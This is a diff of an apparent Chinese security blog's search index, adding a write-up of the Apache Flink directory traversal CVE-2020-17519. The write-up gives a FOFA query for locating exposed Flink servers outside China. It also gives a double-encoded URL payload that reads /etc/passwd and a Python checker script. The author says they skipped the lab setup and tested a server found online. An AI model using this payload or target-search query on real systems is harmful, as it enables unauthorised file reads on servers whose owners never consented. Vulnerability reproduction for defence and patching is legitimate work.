@@ -3,6 +3,46 @@
   
     
     <entry>
+      <title><![CDATA[Apache Flink目录遍历漏洞]]></title>
+      <url>/2021/02/19/CVE-2020-17519/</url>
+      <content type="html"><![CDATA[<h1 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h1><h2 id="Apache-Flink简介"><a href="#Apache-Flink简介" class="headerlink" title="Apache Flink简介"></a>Apache Flink简介</h2><p><code>Apache Flink是一个开源流处理框架，具有强大的流处理和批处理功能</code></p>
+<h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><p>Apache Flink 1.11.0中引入的一个更改，使攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。</p>
+<p>影响版本：<code>1.11.0</code>、<code>1.11.1</code>、<code>1.11.2</code></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub上面有提供环境<code>https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519</code>这里不搭建了，直接网上找一个来进行测试。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Apache Flink" &amp;&amp; country!="CN"</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <img src="/img/CVE-2020-17519/image-20210206124042133.png" alt="image-20210206124042133" title class>
+                <p>image-20210206124042133</p>
+            </figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'</span></span><br><span class="line">    url = addr+payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.request(<span class="string">"GET"</span>,url=url,timeout=<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'root'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(addr+<span class="string">"存在漏洞"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">verify(<span class="string">"addr"</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
+<li><a href="https://mp.weixin.qq.com/s/oxNb_FolmgeSaMPUP_qE-w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/oxNb_FolmgeSaMPUP_qE-w</a></li>
+<li><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/112260367" target="_blank" rel="noopener">https://blog.csdn.net/xuandao_ahfengren/article/details/112260367</a></li>
+</ol>
+]]></content>
+      
+        <categories>
+            
+            <category> 漏洞复现 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Apache Unomi 远程代码执行漏洞]]></title>
       <url>/2021/02/07/CVE-2020-13942/</url>
       <content type="html"><![CDATA[<h1 id="Apache-Unomi-远程代码执行漏洞"><a href="#Apache-Unomi-远程代码执行漏洞" class="headerlink" title="Apache Unomi 远程代码执行漏洞"></a>Apache Unomi 远程代码执行漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Unomi是一个Java开源客户数据平台，这是一个Java服务器，旨在管理客户，潜在顾客和访问者的数据，并帮助个性化客户体验。<code>Apache Unomi &lt; 1.5.2</code>版本存在执行任意代码漏洞。</p>
